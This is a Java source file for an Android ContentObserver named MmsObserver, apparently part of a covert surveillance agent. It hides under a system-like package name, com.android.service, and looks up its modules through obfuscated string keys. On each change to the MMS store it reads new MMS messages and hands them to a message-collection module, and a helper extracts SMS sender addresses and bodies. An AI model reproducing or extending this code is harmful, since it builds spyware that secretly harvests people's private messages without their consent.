package com.android.service.interfaces;

import java.util.ArrayList;
import java.util.Iterator;

import com.android.service.Messages;
import com.android.service.Mms;
import com.android.service.Sms;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.manager.ManagerAgent;
import com.android.service.module.ModuleMessage;
import com.android.service.module.message.MmsBrowser;
import com.android.service.util.Check;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class MmsObserver extends ContentObserver {
	private static final String TAG = "MmsObserver"; //$NON-NLS-1$

	public MmsObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean bSelfChange) {
		super.onChange(bSelfChange);

		// messages: Messages.getString("b.9");
		ModuleMessage a = (ModuleMessage) ManagerAgent.self().get(Messages.getString("b.9"));

		if (a == null) {
			return;
		}
		int lastManagedId = a.getLastManagedMmsId();
		final ContentResolver contentResolver = Status.getAppContext().getContentResolver();

		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android

		// Se questa non dovesse piu andare cambiare in "content://sms"
		// ManagerAgent.get("sms")
		// orig: content://sms/outbox

		/*
		 * I possibili content resolver sono Inbox = "content://sms/inbox"
		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
		 * = "content://sms/all" Conversations = "content://sms/conversations"
		 * All Conversations = "content://mms-sms/conversations" All messages =
		 * "content://mms-sms" All SMS = "content://sms"
		 */

		final MmsBrowser mmsBrowser = new MmsBrowser();
		final ArrayList<Mms> listMms = mmsBrowser.getMmsList(lastManagedId);
		final Iterator<Mms> iterMms = listMms.listIterator();

		while (iterMms.hasNext()) {
			final Mms mms = iterMms.next();
			mms.print();
			a.notification(mms);
		}

		a.updateMarkupMMS(mmsBrowser.getMaxId());

	}

	private void onMmsSend(Cursor cur, String mmsId) {
		final ContentResolver contentResolver = Status.getAppContext().getContentResolver();

		Uri uri = Uri.parse("content://mms/");
		String selection = "_id = " + mmsId;
		Cursor cursor = contentResolver.query(uri, null, selection, null, null);

	}

	private Sms onSmsSend(Cursor cur) {
		// int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
		// int status = cur.getInt(cur.getColumnIndex("status"));

		final String body = cur.getString(cur.getColumnIndex("body")); //$NON-NLS-1$
		final String address = cur.getString(cur.getColumnIndex("address")); //$NON-NLS-1$

		return new Sms(address, body, System.currentTimeMillis(), true);
	}
}
